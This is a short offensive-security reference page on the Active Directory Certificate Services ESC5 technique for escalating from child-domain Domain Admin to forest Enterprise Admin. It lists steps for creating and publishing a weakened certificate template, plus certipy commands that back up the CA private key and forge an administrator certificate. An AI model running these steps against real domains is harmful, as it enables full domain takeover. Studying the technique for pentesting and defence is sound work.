# Active Directory - Certificate ESC5

## ESC5 - Vulnerable PKI Object Access Control

> Escalate the privileges from **Domain Administrator** in the child domain into **Enterprise Administrator** at the forest root.

**Requirements**:

* Add new templates to the "Certificate" Templates container
* "WRITE" access to the `pKIEnrollmentService` object

**Exploitation - Access Control**:

* Use `PsExec` to launch `mmc` as SYSTEM on the child DC: `psexec.exe /accepteula -i -s mmc`
* Connect to "Configuration naming context" > "Certificate Template" container
* Open `certsrv.msc` as SYSTEM and duplicate an existing template
* Edit the properties of the template to:
    * Granting enroll rights to a principal we control in the child domain.
    * Including Client Authentication in the Application Policies.
    * Allowing SANs in certificate requests.
    * Not enabling manager approval or authorized signatures.
* Publish the certificate template to the CA
    * Publish by adding the template to the list in `certificateTemplate` property of `CN=Services`>`CN=Public Key Services`>`CN=Enrollment Services`>`pkiEnrollmentService`
* Finally use the ESC1 vulnerability introduced in the duplicated template to issue a certificate impersonating an Enterprise Administrator.

**Exploitation - Golden Certificate**:

Use `certipy`to extract the CA certificate and private key

```ps1
certipy ca -backup -u user@domain.local -p password -dc-ip 10.10.10.10 -ca 'DOMAIN-CA' -target 10.10.10.11 -debug
```

Then forge a domain admin certificate

```ps1
certipy forge -ca-pfx 'DOMAIN-CA.pfx' -upn administrator@domain.local
```

## References

* [From DA to EA with ESC5 - Andy Robbins - May 16, 2023](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c)
* [GOAD - part 14 - ADCS 5/7/9/10/11/13/14/15 - Mayfly - March 10, 2025](https://mayfly277.github.io/posts/ADCS-part14/)
